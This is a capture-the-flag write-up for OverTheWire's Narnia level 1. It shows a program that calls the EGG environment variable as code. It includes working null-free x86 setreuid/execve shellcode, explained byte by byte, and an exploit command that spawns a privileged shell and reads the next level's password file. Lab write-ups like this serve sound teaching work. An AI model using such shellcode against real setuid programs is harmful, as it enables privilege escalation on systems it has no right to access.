# OverTheWire — Narnia Level 1 → 2

> Goal: Get narnia2 password from `narnia1`. Result: **`**********`** (hidden)
> Technique: Execute **shellcode stored in the `EGG` environment variable** via a function pointer.

---

## 1. Connection
```bash
ssh narnia1@narnia.labs.overthewire.org -p 2226
```

## 2. Source
```c
int main(){
    int (*ret)();
    if(getenv("EGG") == NULL){ printf("Give me something...\n"); exit(1); }
    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");   // ret = address of EGG
    ret();                 // execute the BYTES at that address as code
}
```

## 3. Vulnerability
The program stores the address returned by `getenv("EGG")` directly into a function pointer
and **calls it directly**. No classic overflow — the program treats user-provided data as code.
- **No need to find the address** (the program finds it via `getenv`).
- **No NOP sled needed** (`ret()` jumps directly to the start of the shellcode).
- No stdin/pipe/cat trouble (the binary doesn't read stdin).

## 4. Shellcode (null-free, 57 bytes) — `setreuid` + `execve("/bin/sh")`
| Bytes | Assembly | Description |
|-------|----------|-------------|
| `31 c0` `b0 c9` `cd 80` | `xor eax,eax; mov al,0xc9; int 0x80` | geteuid32 → eax=euid |
| `89 c3` `89 c1` | `mov ebx,eax; mov ecx,eax` | ruid=euid=euid |
| `31 c0` `b0 cb` `cd 80` | `xor eax,eax; mov al,0xcb; int 0x80` | setreuid32(euid,euid) |
| `31 c0` `50` | `xor eax,eax; push eax` | string NUL terminator |
| `b8 2e 72 69 01` `35 01 01 01 01` `50` | `mov eax,..; xor eax,0x01010101; push` | `"/sh\0"` (via XOR) |
| `b8 2e 63 68 6f` `35 01 01 01 01` `50` | `mov eax,..; xor eax,..; push` | `"/bin"` (via XOR) |
| `89 e3` | `mov ebx,esp` | ebx → "/bin/sh" |
| `31 c0 50 53 89 e1` | argv=["/bin/sh",0]; `mov ecx,esp` | ecx → argv |
| `31 d2` `31 c0 b0 0b cd 80` | `xor edx,edx; execve` | execve("/bin/sh",argv,0) |

> The `"/bin/sh"` string is built at runtime via `XOR 0x01010101` (not strictly required for env
> vars, but null-free is sufficient; this shellcode was carried from the repo standard).
> Alternative: classic 25-byte execve shellcode (`\x31\xc0\x50\x68...`) also works.

## 5. Exploit
```bash
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\xb8\x2e\x72\x69\x01\x35\x01\x01\x01\x01\x50\xb8\x2e\x63\x68\x6f\x35\x01\x01\x01\x01\x50\x89\xe3\x31\xc0\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80")')
python3 -c '
import sys,time
time.sleep(0.5)
sys.stdout.buffer.write(b"id; cat /etc/narnia_pass/narnia2\n"); sys.stdout.flush(); time.sleep(1.0)
' | /narnia/narnia1
```
Output: `Trying to execute EGG!` → `uid=14002(narnia2)` → password.



## Lessons
| Topic | Note |
|-------|------|
| Data = code | User data assigned to a function pointer and called → shellcode is sufficient |
| No address hunting | `getenv` + `ret()` jumps right to the start → NOP sled unnecessary |
| Null-free shellcode | Env vars cannot contain null (string terminator) |
| setreuid | Lock the euid (narnia2) so the shell doesn't drop privileges |
